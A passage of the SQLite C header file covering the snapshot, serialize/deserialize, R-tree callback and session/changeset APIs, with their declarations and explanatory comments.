** invoked, then the same read transaction remains open (on the same
** database snapshot) if SQLITE_ERROR, SQLITE_BUSY or SQLITE_ERROR_SNAPSHOT
** is returned. If another error code - for example SQLITE_PROTOCOL or an
** SQLITE_IOERR error code - is returned, then the final state of the
** read transaction is undefined. If SQLITE_OK is returned, then the 
** read transaction is now open on database snapshot P.
**
** ^(A call to [sqlite3_snapshot_open(D,S,P)] will fail if the
** database connection D does not know that the database file for
** schema S is in [WAL mode].  A database connection might not know
** that the database file is in [WAL mode] if there has been no prior
** I/O on that database connection, or if the database entered [WAL mode] 
** after the most recent I/O on the database connection.)^
** (Hint: Run "[PRAGMA application_id]" against a newly opened
** database connection in order to make it ready to use snapshots.)
**
** The [sqlite3_snapshot_open()] interface is only available when the
** [SQLITE_ENABLE_SNAPSHOT] compile-time option is used.
*/
SQLITE_API SQLITE_EXPERIMENTAL int sqlite3_snapshot_open(
  sqlite3 *db,
  const char *zSchema,
  sqlite3_snapshot *pSnapshot
);

/*
** CAPI3REF: Destroy a snapshot
** DESTRUCTOR: sqlite3_snapshot
**
** ^The [sqlite3_snapshot_free(P)] interface destroys [sqlite3_snapshot] P.
** The application must eventually free every [sqlite3_snapshot] object
** using this routine to avoid a memory leak.
**
** The [sqlite3_snapshot_free()] interface is only available when the
** [SQLITE_ENABLE_SNAPSHOT] compile-time option is used.
*/
SQLITE_API SQLITE_EXPERIMENTAL void sqlite3_snapshot_free(sqlite3_snapshot*);

/*
** CAPI3REF: Compare the ages of two snapshot handles.
** METHOD: sqlite3_snapshot
**
** The sqlite3_snapshot_cmp(P1, P2) interface is used to compare the ages
** of two valid snapshot handles. 
**
** If the two snapshot handles are not associated with the same database 
** file, the result of the comparison is undefined. 
**
** Additionally, the result of the comparison is only valid if both of the
** snapshot handles were obtained by calling sqlite3_snapshot_get() since the
** last time the wal file was deleted. The wal file is deleted when the
** database is changed back to rollback mode or when the number of database
** clients drops to zero. If either snapshot handle was obtained before the 
** wal file was last deleted, the value returned by this function 
** is undefined.
**
** Otherwise, this API returns a negative value if P1 refers to an older
** snapshot than P2, zero if the two handles refer to the same database
** snapshot, and a positive value if P1 is a newer snapshot than P2.
**
** This interface is only available if SQLite is compiled with the
** [SQLITE_ENABLE_SNAPSHOT] option.
*/
SQLITE_API SQLITE_EXPERIMENTAL int sqlite3_snapshot_cmp(
  sqlite3_snapshot *p1,
  sqlite3_snapshot *p2
);

/*
** CAPI3REF: Recover snapshots from a wal file
** METHOD: sqlite3_snapshot
**
** If a [WAL file] remains on disk after all database connections close
** (either through the use of the [SQLITE_FCNTL_PERSIST_WAL] [file control]
** or because the last process to have the database opened exited without
** calling [sqlite3_close()]) and a new connection is subsequently opened
** on that database and [WAL file], the [sqlite3_snapshot_open()] interface
** will only be able to open the last transaction added to the WAL file
** even though the WAL file contains other valid transactions.
**
** This function attempts to scan the WAL file associated with database zDb
** of database handle db and make all valid snapshots available to
** sqlite3_snapshot_open(). It is an error if there is already a read
** transaction open on the database, or if the database is not a WAL mode
** database.
**
** SQLITE_OK is returned if successful, or an SQLite error code otherwise.
**
** This interface is only available if SQLite is compiled with the
** [SQLITE_ENABLE_SNAPSHOT] option.
*/
SQLITE_API SQLITE_EXPERIMENTAL int sqlite3_snapshot_recover(sqlite3 *db, const char *zDb);

/*
** CAPI3REF: Serialize a database
**
** The sqlite3_serialize(D,S,P,F) interface returns a pointer to memory
** that is a serialization of the S database on [database connection] D.
** If P is not a NULL pointer, then the size of the database in bytes
** is written into *P.
**
** For an ordinary on-disk database file, the serialization is just a
** copy of the disk file.  For an in-memory database or a "TEMP" database,
** the serialization is the same sequence of bytes which would be written
** to disk if that database where backed up to disk.
**
** The usual case is that sqlite3_serialize() copies the serialization of
** the database into memory obtained from [sqlite3_malloc64()] and returns
** a pointer to that memory.  The caller is responsible for freeing the
** returned value to avoid a memory leak.  However, if the F argument
** contains the SQLITE_SERIALIZE_NOCOPY bit, then no memory allocations
** are made, and the sqlite3_serialize() function will return a pointer
** to the contiguous memory representation of the database that SQLite
** is currently using for that database, or NULL if the no such contiguous
** memory representation of the database exists.  A contiguous memory
** representation of the database will usually only exist if there has
** been a prior call to [sqlite3_deserialize(D,S,...)] with the same
** values of D and S.
** The size of the database is written into *P even if the 
** SQLITE_SERIALIZE_NOCOPY bit is set but no contiguous copy
** of the database exists.
**
** A call to sqlite3_serialize(D,S,P,F) might return NULL even if the
** SQLITE_SERIALIZE_NOCOPY bit is omitted from argument F if a memory
** allocation error occurs.
**
** This interface is only available if SQLite is compiled with the
** [SQLITE_ENABLE_DESERIALIZE] option.
*/
SQLITE_API unsigned char *sqlite3_serialize(
  sqlite3 *db,           /* The database connection */
  const char *zSchema,   /* Which DB to serialize. ex: "main", "temp", ... */
  sqlite3_int64 *piSize, /* Write size of the DB here, if not NULL */
  unsigned int mFlags    /* Zero or more SQLITE_SERIALIZE_* flags */
);

/*
** CAPI3REF: Flags for sqlite3_serialize
**
** Zero or more of the following constants can be OR-ed together for
** the F argument to [sqlite3_serialize(D,S,P,F)].
**
** SQLITE_SERIALIZE_NOCOPY means that [sqlite3_serialize()] will return
** a pointer to contiguous in-memory database that it is currently using,
** without making a copy of the database.  If SQLite is not currently using
** a contiguous in-memory database, then this option causes
** [sqlite3_serialize()] to return a NULL pointer.  SQLite will only be
** using a contiguous in-memory database if it has been initialized by a
** prior call to [sqlite3_deserialize()].
*/
#define SQLITE_SERIALIZE_NOCOPY 0x001   /* Do no memory allocations */

/*
** CAPI3REF: Deserialize a database
**
** The sqlite3_deserialize(D,S,P,N,M,F) interface causes the 
** [database connection] D to disconnect from database S and then
** reopen S as an in-memory database based on the serialization contained
** in P.  The serialized database P is N bytes in size.  M is the size of
** the buffer P, which might be larger than N.  If M is larger than N, and
** the SQLITE_DESERIALIZE_READONLY bit is not set in F, then SQLite is
** permitted to add content to the in-memory database as long as the total
** size does not exceed M bytes.
**
** If the SQLITE_DESERIALIZE_FREEONCLOSE bit is set in F, then SQLite will
** invoke sqlite3_free() on the serialization buffer when the database
** connection closes.  If the SQLITE_DESERIALIZE_RESIZEABLE bit is set, then
** SQLite will try to increase the buffer size using sqlite3_realloc64()
** if writes on the database cause it to grow larger than M bytes.
**
** The sqlite3_deserialize() interface will fail with SQLITE_BUSY if the
** database is currently in a read transaction or is involved in a backup
** operation.
**
** If sqlite3_deserialize(D,S,P,N,M,F) fails for any reason and if the 
** SQLITE_DESERIALIZE_FREEONCLOSE bit is set in argument F, then
** [sqlite3_free()] is invoked on argument P prior to returning.
**
** This interface is only available if SQLite is compiled with the
** [SQLITE_ENABLE_DESERIALIZE] option.
*/
SQLITE_API int sqlite3_deserialize(
  sqlite3 *db,            /* The database connection */
  const char *zSchema,    /* Which DB to reopen with the deserialization */
  unsigned char *pData,   /* The serialized database content */
  sqlite3_int64 szDb,     /* Number bytes in the deserialization */
  sqlite3_int64 szBuf,    /* Total size of buffer pData[] */
  unsigned mFlags         /* Zero or more SQLITE_DESERIALIZE_* flags */
);

/*
** CAPI3REF: Flags for sqlite3_deserialize()
**
** The following are allowed values for 6th argument (the F argument) to
** the [sqlite3_deserialize(D,S,P,N,M,F)] interface.
**
** The SQLITE_DESERIALIZE_FREEONCLOSE means that the database serialization
** in the P argument is held in memory obtained from [sqlite3_malloc64()]
** and that SQLite should take ownership of this memory and automatically
** free it when it has finished using it.  Without this flag, the caller
** is responsible for freeing any dynamically allocated memory.
**
** The SQLITE_DESERIALIZE_RESIZEABLE flag means that SQLite is allowed to
** grow the size of the database using calls to [sqlite3_realloc64()].  This
** flag should only be used if SQLITE_DESERIALIZE_FREEONCLOSE is also used.
** Without this flag, the deserialized database cannot increase in size beyond
** the number of bytes specified by the M parameter.
**
** The SQLITE_DESERIALIZE_READONLY flag means that the deserialized database
** should be treated as read-only.
*/
#define SQLITE_DESERIALIZE_FREEONCLOSE 1 /* Call sqlite3_free() on close */
#define SQLITE_DESERIALIZE_RESIZEABLE  2 /* Resize using sqlite3_realloc64() */
#define SQLITE_DESERIALIZE_READONLY    4 /* Database is read-only */

/*
** Undo the hack that converts floating point types to integer for
** builds on processors without floating point support.
*/
#ifdef SQLITE_OMIT_FLOATING_POINT
# undef double
#endif

#ifdef __cplusplus
}  /* End of the 'extern "C"' block */
#endif
#endif /* SQLITE3_H */

/******** Begin file sqlite3rtree.h *********/
/*
** 2010 August 30
**
** The author disclaims copyright to this source code.  In place of
** a legal notice, here is a blessing:
**
**    May you do good and not evil.
**    May you find forgiveness for yourself and forgive others.
**    May you share freely, never taking more than you give.
**
*************************************************************************
*/

#ifndef _SQLITE3RTREE_H_
#define _SQLITE3RTREE_H_


#ifdef __cplusplus
extern "C" {
#endif

typedef struct sqlite3_rtree_geometry sqlite3_rtree_geometry;
typedef struct sqlite3_rtree_query_info sqlite3_rtree_query_info;

/* The double-precision datatype used by RTree depends on the
** SQLITE_RTREE_INT_ONLY compile-time option.
*/
#ifdef SQLITE_RTREE_INT_ONLY
  typedef sqlite3_int64 sqlite3_rtree_dbl;
#else
  typedef double sqlite3_rtree_dbl;
#endif

/*
** Register a geometry callback named zGeom that can be used as part of an
** R-Tree geometry query as follows:
**
**   SELECT ... FROM <rtree> WHERE <rtree col> MATCH $zGeom(... params ...)
*/
SQLITE_API int sqlite3_rtree_geometry_callback(
  sqlite3 *db,
  const char *zGeom,
  int (*xGeom)(sqlite3_rtree_geometry*, int, sqlite3_rtree_dbl*,int*),
  void *pContext
);


/*
** A pointer to a structure of the following type is passed as the first
** argument to callbacks registered using rtree_geometry_callback().
*/
struct sqlite3_rtree_geometry {
  void *pContext;                 /* Copy of pContext passed to s_r_g_c() */
  int nParam;                     /* Size of array aParam[] */
  sqlite3_rtree_dbl *aParam;      /* Parameters passed to SQL geom function */
  void *pUser;                    /* Callback implementation user data */
  void (*xDelUser)(void *);       /* Called by SQLite to clean up pUser */
};

/*
** Register a 2nd-generation geometry callback named zScore that can be 
** used as part of an R-Tree geometry query as follows:
**
**   SELECT ... FROM <rtree> WHERE <rtree col> MATCH $zQueryFunc(... params ...)
*/
SQLITE_API int sqlite3_rtree_query_callback(
  sqlite3 *db,
  const char *zQueryFunc,
  int (*xQueryFunc)(sqlite3_rtree_query_info*),
  void *pContext,
  void (*xDestructor)(void*)
);


/*
** A pointer to a structure of the following type is passed as the 
** argument to scored geometry callback registered using
** sqlite3_rtree_query_callback().
**
** Note that the first 5 fields of this structure are identical to
** sqlite3_rtree_geometry.  This structure is a subclass of
** sqlite3_rtree_geometry.
*/
struct sqlite3_rtree_query_info {
  void *pContext;                   /* pContext from when function registered */
  int nParam;                       /* Number of function parameters */
  sqlite3_rtree_dbl *aParam;        /* value of function parameters */
  void *pUser;                      /* callback can use this, if desired */
  void (*xDelUser)(void*);          /* function to free pUser */
  sqlite3_rtree_dbl *aCoord;        /* Coordinates of node or entry to check */
  unsigned int *anQueue;            /* Number of pending entries in the queue */
  int nCoord;                       /* Number of coordinates */
  int iLevel;                       /* Level of current node or entry */
  int mxLevel;                      /* The largest iLevel value in the tree */
  sqlite3_int64 iRowid;             /* Rowid for current entry */
  sqlite3_rtree_dbl rParentScore;   /* Score of parent node */
  int eParentWithin;                /* Visibility of parent node */
  int eWithin;                      /* OUT: Visibility */
  sqlite3_rtree_dbl rScore;         /* OUT: Write the score here */
  /* The following fields are only available in 3.8.11 and later */
  sqlite3_value **apSqlParam;       /* Original SQL values of parameters */
};

/*
** Allowed values for sqlite3_rtree_query.eWithin and .eParentWithin.
*/
#define NOT_WITHIN       0   /* Object completely outside of query region */
#define PARTLY_WITHIN    1   /* Object partially overlaps query region */
#define FULLY_WITHIN     2   /* Object fully contained within query region */


#ifdef __cplusplus
}  /* end of the 'extern "C"' block */
#endif

#endif  /* ifndef _SQLITE3RTREE_H_ */

/******** End of sqlite3rtree.h *********/
/******** Begin file sqlite3session.h *********/

#if !defined(__SQLITESESSION_H_) && defined(SQLITE_ENABLE_SESSION)
#define __SQLITESESSION_H_ 1

/*
** Make sure we can call this stuff from C++.
*/
#ifdef __cplusplus
extern "C" {
#endif


/*
** CAPI3REF: Session Object Handle
**
** An instance of this object is a [session] that can be used to
** record changes to a database.
*/
typedef struct sqlite3_session sqlite3_session;

/*
** CAPI3REF: Changeset Iterator Handle
**
** An instance of this object acts as a cursor for iterating
** over the elements of a [changeset] or [patchset].
*/
typedef struct sqlite3_changeset_iter sqlite3_changeset_iter;

/*
** CAPI3REF: Create A New Session Object
** CONSTRUCTOR: sqlite3_session
**
** Create a new session object attached to database handle db. If successful,
** a pointer to the new object is written to *ppSession and SQLITE_OK is
** returned. If an error occurs, *ppSession is set to NULL and an SQLite
** error code (e.g. SQLITE_NOMEM) is returned.
**
** It is possible to create multiple session objects attached to a single
** database handle.
**
** Session objects created using this function should be deleted using the
** [sqlite3session_delete()] function before the database handle that they
** are attached to is itself closed. If the database handle is closed before
** the session object is deleted, then the results of calling any session
** module function, including [sqlite3session_delete()] on the session object
** are undefined.
**
** Because the session module uses the [sqlite3_preupdate_hook()] API, it
** is not possible for an application to register a pre-update hook on a
** database handle that has one or more session objects attached. Nor is
** it possible to create a session object attached to a database handle for
** which a pre-update hook is already defined. The results of attempting 
** either of these things are undefined.
**
** The session object will be used to create changesets for tables in
** database zDb, where zDb is either "main", or "temp", or the name of an
** attached database. It is not an error if database zDb is not attached
** to the database when the session object is created.
*/
SQLITE_API int sqlite3session_create(
  sqlite3 *db,                    /* Database handle */
  const char *zDb,                /* Name of db (e.g. "main") */
  sqlite3_session **ppSession     /* OUT: New session object */
);

/*
** CAPI3REF: Delete A Session Object
** DESTRUCTOR: sqlite3_session
**
** Delete a session object previously allocated using 
** [sqlite3session_create()]. Once a session object has been deleted, the
** results of attempting to use pSession with any other session module
** function are undefined.
**
** Session objects must be deleted before the database handle to which they
** are attached is closed. Refer to the documentation for 
** [sqlite3session_create()] for details.
*/
SQLITE_API void sqlite3session_delete(sqlite3_session *pSession);


/*
** CAPI3REF: Enable Or Disable A Session Object
** METHOD: sqlite3_session
**
** Enable or disable the recording of changes by a session object. When
** enabled, a session object records changes made to the database. When
** disabled - it does not. A newly created session object is enabled.
** Refer to the documentation for [sqlite3session_changeset()] for further
** details regarding how enabling and disabling a session object affects
** the eventual changesets.
**
** Passing zero to this function disables the session. Passing a value
** greater than zero enables it. Passing a value less than zero is a 
** no-op, and may be used to query the current state of the session.
**
** The return value indicates the final state of the session object: 0 if 
** the session is disabled, or 1 if it is enabled.
*/
SQLITE_API int sqlite3session_enable(sqlite3_session *pSession, int bEnable);

/*
** CAPI3REF: Set Or Clear the Indirect Change Flag
** METHOD: sqlite3_session
**
** Each change recorded by a session object is marked as either direct or
** indirect. A change is marked as indirect if either:
**
** <ul>
**   <li> The session object "indirect" flag is set when the change is
**        made, or
**   <li> The change is made by an SQL trigger or foreign key action 
**        instead of directly as a result of a users SQL statement.
** </ul>
**
** If a single row is affected by more than one operation within a session,
** then the change is considered indirect if all operations meet the criteria
** for an indirect change above, or direct otherwise.
**
** This function is used to set, clear or query the session object indirect
** flag.  If the second argument passed to this function is zero, then the
** indirect flag is cleared. If it is greater than zero, the indirect flag
** is set. Passing a value less than zero does not modify the current value
** of the indirect flag, and may be used to query the current state of the 
** indirect flag for the specified session object.
**
** The return value indicates the final state of the indirect flag: 0 if 
** it is clear, or 1 if it is set.
*/
SQLITE_API int sqlite3session_indirect(sqlite3_session *pSession, int bIndirect);

/*
** CAPI3REF: Attach A Table To A Session Object
** METHOD: sqlite3_session
**
** If argument zTab is not NULL, then it is the name of a table to attach
** to the session object passed as the first argument. All subsequent changes 
** made to the table while the session object is enabled will be recorded. See 
** documentation for [sqlite3session_changeset()] for further details.
**
** Or, if argument zTab is NULL, then changes are recorded for all tables
** in the database. If additional tables are added to the database (by 
** executing "CREATE TABLE" statements) after this call is made, changes for 
** the new tables are also recorded.
**
** Changes can only be recorded for tables that have a PRIMARY KEY explicitly
** defined as part of their CREATE TABLE statement. It does not matter if the 
** PRIMARY KEY is an "INTEGER PRIMARY KEY" (rowid alias) or not. The PRIMARY
** KEY may consist of a single column, or may be a composite key.
** 
** It is not an error if the named table does not exist in the database. Nor
** is it an error if the named table does not have a PRIMARY KEY. However,
** no changes will be recorded in either of these scenarios.
**
** Changes are not recorded for individual rows that have NULL values stored
** in one or more of their PRIMARY KEY columns.
**
** SQLITE_OK is returned if the call completes without error. Or, if an error 
** occurs, an SQLite error code (e.g. SQLITE_NOMEM) is returned.
**
** <h3>Special sqlite_stat1 Handling</h3>
**
** As of SQLite version 3.22.0, the "sqlite_stat1" table is an exception to 
** some of the rules above. In SQLite, the schema of sqlite_stat1 is:
**  <pre>
**  &nbsp;     CREATE TABLE sqlite_stat1(tbl,idx,stat)  
**  </pre>
**
** Even though sqlite_stat1 does not have a PRIMARY KEY, changes are 
** recorded for it as if the PRIMARY KEY is (tbl,idx). Additionally, changes 
** are recorded for rows for which (idx IS NULL) is true. However, for such
** rows a zero-length blob (SQL value X'') is stored in the changeset or
** patchset instead of a NULL value. This allows such changesets to be
** manipulated by legacy implementations of sqlite3changeset_invert(),
** concat() and similar.
**
** The sqlite3changeset_apply() function automatically converts the 
** zero-length blob back to a NULL value when updating the sqlite_stat1
** table. However, if the application calls sqlite3changeset_new(),
** sqlite3changeset_old() or sqlite3changeset_conflict on a changeset 
** iterator directly (including on a changeset iterator passed to a
** conflict-handler callback) then the X'' value is returned. The application
** must translate X'' to NULL itself if required.
**
** Legacy (older than 3.22.0) versions of the sessions module cannot capture
** changes made to the sqlite_stat1 table. Legacy versions of the
** sqlite3changeset_apply() function silently ignore any modifications to the
** sqlite_stat1 table that are part of a changeset or patchset.
*/
SQLITE_API int sqlite3session_attach(
  sqlite3_session *pSession,      /* Session object */
  const char *zTab                /* Table name */
);

/*
** CAPI3REF: Set a table filter on a Session Object.
** METHOD: sqlite3_session
**
** The second argument (xFilter) is the "filter callback". For changes to rows 
** in tables that are not attached to the Session object, the filter is called
** to determine whether changes to the table's rows should be tracked or not. 
** If xFilter returns 0, changes is not tracked. Note that once a table is 
** attached, xFilter will not be called again.
*/
SQLITE_API void sqlite3session_table_filter(
  sqlite3_session *pSession,      /* Session object */
  int(*xFilter)(
    void *pCtx,                   /* Copy of third arg to _filter_table() */
    const char *zTab              /* Table name */
  ),
  void *pCtx                      /* First argument passed to xFilter */
);

/*
** CAPI3REF: Generate A Changeset From A Session Object
** METHOD: sqlite3_session
**
** Obtain a changeset containing changes to the tables attached to the 
** session object passed as the first argument. If successful, 
** set *ppChangeset to point to a buffer containing the changeset 
** and *pnChangeset to the size of the changeset in bytes before returning
** SQLITE_OK. If an error occurs, set both *ppChangeset and *pnChangeset to
** zero and return an SQLite error code.
**
** A changeset consists of zero or more INSERT, UPDATE and/or DELETE changes,
** each representing a change to a single row of an attached table. An INSERT
** change contains the values of each field of a new database row. A DELETE
** contains the original values of each field of a deleted database row. An
** UPDATE change contains the original values of each field of an updated
** database row along with the updated values for each updated non-primary-key
** column. It is not possible for an UPDATE change to represent a change that
** modifies the values of primary key columns. If such a change is made, it
** is represented in a changeset as a DELETE followed by an INSERT.
**
** Changes are not recorded for rows that have NULL values stored in one or 
** more of their PRIMARY KEY columns. If such a row is inserted or deleted,
** no corresponding change is present in the changesets returned by this
** function. If an existing row with one or more NULL values stored in
** PRIMARY KEY columns is updated so that all PRIMARY KEY columns are non-NULL,
** only an INSERT is appears in the changeset. Similarly, if an existing row
** with non-NULL PRIMARY KEY values is updated so that one or more of its
** PRIMARY KEY columns are set to NULL, the resulting changeset contains a
** DELETE change only.
**
** The contents of a changeset may be traversed using an iterator created
** using the [sqlite3changeset_start()] API. A changeset may be applied to
** a database with a compatible schema using the [sqlite3changeset_apply()]
** API.
**
** Within a changeset generated by this function, all changes related to a
** single table are grouped together. In other words, when iterating through
** a changeset or when applying a changeset to a database, all changes related
** to a single table are processed before moving on to the next table. Tables
** are sorted in the same order in which they were attached (or auto-attached)
** to the sqlite3_session object. The order in which the changes related to
** a single table are stored is undefined.
**
** Following a successful call to this function, it is the responsibility of
** the caller to eventually free the buffer that *ppChangeset points to using
** [sqlite3_free()].
**
** <h3>Changeset Generation</h3>
**
** Once a table has been attached to a session object, the session object
** records the primary key values of all new rows inserted into the table.
** It also records the original primary key and other column values of any
** deleted or updated rows. For each unique primary key value, data is only
** recorded once - the first time a row with said primary key is inserted,
** updated or deleted in the lifetime of the session.
**
** There is one exception to the previous paragraph: when a row is inserted,
** updated or deleted, if one or more of its primary key columns contain a
** NULL value, no record of the change is made.
**
** The session object therefore accumulates two types of records - those
** that consist of primary key values only (created when the user inserts
** a new record) and those that consist of the primary key values and the
** original values of other table columns (created when the users deletes
** or updates a record).
**
** When this function is called, the requested changeset is created using
** both the accumulated records and the current contents of the database
** file. Specifically:
**
** <ul>
**   <li> For each record generated by an insert, the database is queried
**        for a row with a matching primary key. If one is found, an INSERT
**        change is added to the changeset. If no such row is found, no change 
**        is added to the changeset.
**
**   <li> For each record generated by an update or delete, the database is 
**        queried for a row with a matching primary key. If such a row is
**        found and one or more of the non-primary key fields have been
**        modified from their original values, an UPDATE change is added to 
**        the changeset. Or, if no such row is found in the table, a DELETE 
**        change is added to the changeset. If there is a row with a matching
**        primary key in the database, but all fields contain their original
**        values, no change is added to the changeset.
** </ul>
**
** This means, amongst other things, that if a row is inserted and then later
** deleted while a session object is active, neither the insert nor the delete
** will be present in the changeset. Or if a row is deleted and then later a 
** row with the same primary key values inserted while a session object is
** active, the resulting changeset will contain an UPDATE change instead of
** a DELETE and an INSERT.
**
** When a session object is disabled (see the [sqlite3session_enable()] API),
** it does not accumulate records when rows are inserted, updated or deleted.
** This may appear to have some counter-intuitive effects if a single row
** is written to more than once during a session. For example, if a row
** is inserted while a session object is enabled, then later deleted while 
** the same session object is disabled, no INSERT record will appear in the
** changeset, even though the delete took place while the session was disabled.
** Or, if one field of a row is updated while a session is disabled, and 
** another field of the same row is updated while the session is enabled, the
** resulting changeset will contain an UPDATE change that updates both fields.
*/
SQLITE_API int sqlite3session_changeset(
  sqlite3_session *pSession,      /* Session object */
  int *pnChangeset,               /* OUT: Size of buffer at *ppChangeset */
  void **ppChangeset              /* OUT: Buffer containing changeset */
);

/*
** CAPI3REF: Load The Difference Between Tables Into A Session
** METHOD: sqlite3_session
**
** If it is not already attached to the session object passed as the first
** argument, this function attaches table zTbl in the same manner as the
** [sqlite3session_attach()] function. If zTbl does not exist, or if it
** does not have a primary key, this function is a no-op (but does not return
** an error).
**
** Argument zFromDb must be the name of a database ("main", "temp" etc.)
** attached to the same database handle as the session object that contains 
** a table compatible with the table attached to the session by this function.
** A table is considered compatible if it:
**
** <ul>
**   <li> Has the same name,
**   <li> Has the same set of columns declared in the same order, and
**   <li> Has the same PRIMARY KEY definition.
** </ul>
**
** If the tables are not compatible, SQLITE_SCHEMA is returned. If the tables
** are compatible but do not have any PRIMARY KEY columns, it is not an error
** but no changes are added to the session object. As with other session
** APIs, tables without PRIMARY KEYs are simply ignored.
**
** This function adds a set of changes to the session object that could be
** used to update the table in database zFrom (call this the "from-table") 
** so that its content is the same as the table attached to the session 
** object (call this the "to-table"). Specifically:
**
** <ul>
**   <li> For each row (primary key) that exists in the to-table but not in 
**     the from-table, an INSERT record is added to the session object.
**
**   <li> For each row (primary key) that exists in the to-table but not in 
**     the from-table, a DELETE record is added to the session object.
**
**   <li> For each row (primary key) that exists in both tables, but features 
**     different non-PK values in each, an UPDATE record is added to the
**     session.  
** </ul>
**
** To clarify, if this function is called and then a changeset constructed
** using [sqlite3session_changeset()], then after applying that changeset to 
** database zFrom the contents of the two compatible tables would be 
** identical.
**
** It an error if database zFrom does not exist or does not contain the
** required compatible table.
**
** If the operation successful, SQLITE_OK is returned. Otherwise, an SQLite
** error code. In this case, if argument pzErrMsg is not NULL, *pzErrMsg
** may be set to point to a buffer containing an English language error 
** message. It is the responsibility of the caller to free this buffer using
** sqlite3_free().
*/
SQLITE_API int sqlite3session_diff(
  sqlite3_session *pSession,
  const char *zFromDb,
  const char *zTbl,
  char **pzErrMsg
);


/*
** CAPI3REF: Generate A Patchset From A Session Object
** METHOD: sqlite3_session
**
** The differences between a patchset and a changeset are that:
**
** <ul>
**   <li> DELETE records consist of the primary key fields only. The 
**        original values of other fields are omitted.
**   <li> The original values of any modified fields are omitted from 
**        UPDATE records.
** </ul>
**
** A patchset blob may be used with up to date versions of all 
** sqlite3changeset_xxx API functions except for sqlite3changeset_invert(), 
** which returns SQLITE_CORRUPT if it is passed a patchset. Similarly,
** attempting to use a patchset blob with old versions of the
** sqlite3changeset_xxx APIs also provokes an SQLITE_CORRUPT error. 
**
** Because the non-primary key "old.*" fields are omitted, no 
** SQLITE_CHANGESET_DATA conflicts can be detected or reported if a patchset
** is passed to the sqlite3changeset_apply() API. Other conflict types work
** in the same way as for changesets.
**
** Changes within a patchset are ordered in the same way as for changesets
** generated by the sqlite3session_changeset() function (i.e. all changes for
** a single table are grouped together, tables appear in the order in which
** they were attached to the session object).
*/
SQLITE_API int sqlite3session_patchset(
  sqlite3_session *pSession,      /* Session object */
  int *pnPatchset,                /* OUT: Size of buffer at *ppPatchset */
  void **ppPatchset               /* OUT: Buffer containing patchset */
);

/*
** CAPI3REF: Test if a changeset has recorded any changes.
**
** Return non-zero if no changes to attached tables have been recorded by 
** the session object passed as the first argument. Otherwise, if one or 
** more changes have been recorded, return zero.
**
** Even if this function returns zero, it is possible that calling
** [sqlite3session_changeset()] on the session handle may still return a
** changeset that contains no changes. This can happen when a row in 
** an attached table is modified and then later on the original values 
** are restored. However, if this function returns non-zero, then it is
** guaranteed that a call to sqlite3session_changeset() will return a 
** changeset containing zero changes.
*/
SQLITE_API int sqlite3session_isempty(sqlite3_session *pSession);

/*
** CAPI3REF: Create An Iterator To Traverse A Changeset 
** CONSTRUCTOR: sqlite3_changeset_iter
**
** Create an iterator used to iterate through the contents of a changeset.
** If successful, *pp is set to point to the iterator handle and SQLITE_OK
** is returned. Otherwise, if an error occurs, *pp is set to zero and an
** SQLite error code is returned.
**
** The following functions can be used to advance and query a changeset 
** iterator created by this function:
**
** <ul>
**   <li> [sqlite3changeset_next()]
**   <li> [sqlite3changeset_op()]
**   <li> [sqlite3changeset_new()]
**   <li> [sqlite3changeset_old()]
** </ul>
**
** It is the responsibility of the caller to eventually destroy the iterator
** by passing it to [sqlite3changeset_finalize()]. The buffer containing the
** changeset (pChangeset) must remain valid until after the iterator is
** destroyed.
**
** Assuming the changeset blob was created by one of the
** [sqlite3session_changeset()], [sqlite3changeset_concat()] or
** [sqlite3changeset_invert()] functions, all changes within the changeset 
** that apply to a single table are grouped together. This means that when 
** an application iterates through a changeset using an iterator created by 
** this function, all changes that relate to a single table are visited 
** consecutively. There is no chance that the iterator will visit a change 
** the applies to table X, then one for table Y, and then later on visit 
** another change for table X.
**
** The behavior of sqlite3changeset_start_v2() and its streaming equivalent
** may be modified by passing a combination of
** [SQLITE_CHANGESETSTART_INVERT | supported flags] as the 4th parameter.
**
** Note that the sqlite3changeset_start_v2() API is still <b>experimental</b>
** and therefore subject to change.
*/
SQLITE_API int sqlite3changeset_start(
  sqlite3_changeset_iter **pp,    /* OUT: New changeset iterator handle */
  int nChangeset,                 /* Size of changeset blob in bytes */
  void *pChangeset                /* Pointer to blob containing changeset */
);
SQLITE_API int sqlite3changeset_start_v2(
  sqlite3_changeset_iter **pp,    /* OUT: New changeset iterator handle */
  int nChangeset,                 /* Size of changeset blob in bytes */
  void *pChangeset,               /* Pointer to blob containing changeset */
  int flags                       /* SESSION_CHANGESETSTART_* flags */
);

/*
** CAPI3REF: Flags for sqlite3changeset_start_v2
**
** The following flags may passed via the 4th parameter to
** [sqlite3changeset_start_v2] and [sqlite3changeset_start_v2_strm]:
**
** <dt>SQLITE_CHANGESETAPPLY_INVERT <dd>
**   Invert the changeset while iterating through it. This is equivalent to
**   inverting a changeset using sqlite3changeset_invert() before applying it.
**   It is an error to specify this flag with a patchset.
*/
#define SQLITE_CHANGESETSTART_INVERT        0x0002


/*
** CAPI3REF: Advance A Changeset Iterator
** METHOD: sqlite3_changeset_iter
**
** This function may only be used with iterators created by function
** [sqlite3changeset_start()]. If it is called on an iterator passed to
** a conflict-handler callback by [sqlite3changeset_apply()], SQLITE_MISUSE
** is returned and the call has no effect.
**
** Immediately after an iterator is created by sqlite3changeset_start(), it
** does not point to any change in the changeset. Assuming the changeset
** is not empty, the first call to this function advances the iterator to
** point to the first change in the changeset. Each subsequent call advances
** the iterator to point to the next change in the changeset (if any). If
** no error occurs and the iterator points to a valid change after a call
** to sqlite3changeset_next() has advanced it, SQLITE_ROW is returned. 
** Otherwise, if all changes in the changeset have already been visited,
** SQLITE_DONE is returned.
**
** If an error occurs, an SQLite error code is returned. Possible error 
** codes include SQLITE_CORRUPT (if the changeset buffer is corrupt) or 
** SQLITE_NOMEM.
*/
SQLITE_API int sqlite3changeset_next(sqlite3_changeset_iter *pIter);

/*
** CAPI3REF: Obtain The Current Operation From A Changeset Iterator
** METHOD: sqlite3_changeset_iter
**
** The pIter argument passed to this function may either be an iterator
** passed to a conflict-handler by [sqlite3changeset_apply()], or an iterator
** created by [sqlite3changeset_start()]. In the latter case, the most recent
** call to [sqlite3changeset_next()] must have returned [SQLITE_ROW]. If this
** is not the case, this function returns [SQLITE_MISUSE].
**
** If argument pzTab is not NULL, then *pzTab is set to point to a
** nul-terminated utf-8 encoded string containing the name of the table
** affected by the current change. The buffer remains valid until either
** sqlite3changeset_next() is called on the iterator or until the 
** conflict-handler function returns. If pnCol is not NULL, then *pnCol is 
** set to the number of columns in the table affected by the change. If
** pbIndirect is not NULL, then *pbIndirect is set to true (1) if the change
** is an indirect change, or false (0) otherwise. See the documentation for
** [sqlite3session_indirect()] for a description of direct and indirect
